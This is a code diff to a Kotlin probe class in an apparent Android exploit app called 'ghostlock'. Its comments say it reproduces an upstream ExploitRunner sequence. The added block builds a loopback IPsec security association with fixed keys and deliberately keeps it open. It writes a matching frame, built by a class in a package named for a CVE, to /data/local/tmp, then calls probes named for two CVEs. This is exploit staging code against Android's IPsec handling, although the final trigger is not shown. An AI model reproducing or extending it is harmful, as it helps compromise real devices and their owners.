@@ -118,6 +118,40 @@ object TypedBackendProbe {
             step("typed: sa frame refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
         }
 
+        /* 按上游序列建 SA（ExploitRunner.java:54-80）：开着 encap 套接字 → getPort → 申请 SPI → getSpi → */
+        /* new IpSecAlgorithm(CRYPT_AES_CBC / AUTH_HMAC_SHA256) → setIpv4Encapsulation → build(loopback, spiObj)。 */
+        /* transform 与 encap 套接字都保持打开（close 会拆 SA）。 */
+        runCatching {
+            val manager = context.getSystemService(android.net.IpSecManager::class.java)!!
+            val encap = manager.openUdpEncapsulationSocket()
+            val encapPort = encap.getPort()
+            step("typed: ipsec sa encapPort=" + encapPort)
+            val loopback = java.net.InetAddress.getByName("127.0.0.1")
+            val spiObj = manager.allocateSecurityParameterIndex(loopback)
+            val spi = spiObj.getSpi()
+            step("typed: ipsec sa spi=0x" + Integer.toHexString(spi))
+            val aesKey = ByteArray(32) { index -> (0xA0 + index).toByte() }
+            val hmacKey = ByteArray(32) { index -> (0xB0 + index).toByte() }
+            val transform = android.net.IpSecTransform.Builder(context)
+                .setEncryption(
+                    android.net.IpSecAlgorithm(android.net.IpSecAlgorithm.CRYPT_AES_CBC, aesKey),
+                )
+                .setAuthentication(
+                    android.net.IpSecAlgorithm(android.net.IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, 96),
+                )
+                .setIpv4Encapsulation(encap, 4500)
+                .buildTransportModeTransform(loopback, spiObj)
+            step("typed: ipsec sa built transform=" + (transform != null))
+            val frame = com.ghostlock.app.jni.cve43284.SaFrame.build(spi, encapPort, 4500, aesKey, hmacKey)
+            val written = com.ghostlock.app.jni.cve43284.SaFrame.writeTo(
+                "/data/local/tmp/ghostlock-sa.frame",
+                frame,
+            )
+            step("typed: ipsec sa frame=" + written + " (SA 已建、帧按同一材料落盘)")
+        }.onFailure { problem ->
+            step("typed: ipsec sa refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+        }
+
         probe43499(::step)
         probe43284(::step)
         return lines
